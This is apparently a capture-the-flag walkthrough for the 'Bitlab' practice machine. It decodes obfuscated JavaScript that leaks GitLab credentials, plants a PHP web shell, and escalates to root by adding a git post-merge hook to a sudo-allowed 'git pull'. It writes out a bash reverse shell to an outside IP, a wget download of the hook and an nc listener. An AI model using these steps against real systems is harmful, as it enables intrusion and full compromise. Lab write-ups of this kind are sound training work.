@@ -1,0 +1,110 @@
+FootHold :
+
+On page : http://10.10.10.114/help/bookmarks.html
+There's a Gitlab Login page with weird Js code.
+I name it as weird.js in this folder.
+
+javascript:(function(){%20var%20_0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]=%20_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5];%20})()
+
+
+and we can decode it by python function:
+>>> print( bytes.decode("\x76\x61\x6C\x75\x65")  )
+value
+>>> print( bytes.decode("\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E")  )
+user_login
+>>> print( bytes.decode("\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64")  )
+getElementById
+>>> print( bytes.decode("\x63\x6C\x61\x76\x65")  )
+clave
+>>> print( bytes.decode("\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64")  )
+user_password
+>>> print( bytes.decode("\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78")  )
+11des0081x
+
+
+clave:11des0081x login to bitlab:
+After logging in, upload your shell.php at repo master -> New File -> copy paste -> commit change 
+                                                       -> Submit merge request -> Merge
+
+Now Surf the url : 10.10.10.114/profile/bug2.php
+get shell as www-data
+
+=================================================================================================
+
+
+Root Shell:
+
+Wei'll find out smt as $ sudo -l
+Matching Defaults entries for www-data on bitlab:
+    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+
+
+
+Now we do some searching with gitlab webhook
+
+Webhook is a file that will execute after git post pull or merge request.
+And !! git pull runs git fetch with the given parameters and calls git merge to merge the retrieved branch heads into the current branch.
+( by the docs ) : https://git-scm.com/docs/git-pull
+
+ANDD!!! https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks
+post-merge hook is a hook will be triggered after merge request.
+
+So, if we create a file any where at a git project on server
+and write a file named post-merge , we could using sudo /usr/bin/git pull
+THEN git will execute post-merge file !!!!!
+if we write rev shell bash at the file, we could get root shell !!!
+
+
+My post-merge :
+root@kali:~/Desktop/htb/bitlab# cat post-merge 
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.15.234/5544 0>&1
+
+
+Steps : 
+www-data@bitlab:/var/www/html$ mkdir /tmp/buggy
+www-data@bitlab:/var/www/html$ cp -r ./profile /tmp/buggy
+www-data@bitlab:/tmp/buggy/profile/.git/hooks$ wget 10.10.15.234:8000/post-merge
+www-data@bitlab:/tmp/buggy/profile/.git/hooks$ chmod +x post-merge
+www-data@bitlab:/tmp/buggy/profile$sudo /usr/bin/git pull
+sudo /usr/bin/git pull
+remote: Enumerating objects: 8, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (5/5), done.
+remote: Total 8 (delta 3), reused 6 (delta 2)
+Unpacking objects: 100% (8/8), done.
+From ssh://localhost:3022/root/profile
+   2721ee4..a15c3e7  master     -> origin/master
+ * [new branch]      patch-18   -> origin/patch-18
+ * [new branch]      patch-19   -> origin/patch-19
+Updating 2721ee4..a15c3e7
+Fast-forward
+ l.t      |   1 +
+ nn44EXen | 166 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 2 files changed, 167 insertions(+)
+ create mode 100644 l.t
+ create mode 100644 nn44EXen
+
+
+
+
+
+root@kali:~/Desktop/htb/bitlab# nc -lnvp 5544
+listening on [any] 5544 ...
+connect to [10.10.15.234] from (UNKNOWN) [10.10.10.114] 34240
+root@bitlab:/tmp/buggy/profile# whoami
+whoami
+root
+root@bitlab:/tmp/buggy/profile# cat /root/root.txt
+cat /root/root.txt
+8d4cc131757957cb68d9a0cddccd587c
+root@bitlab:/tmp/buggy/profile# 
+
+
+
+
+DONE :D !
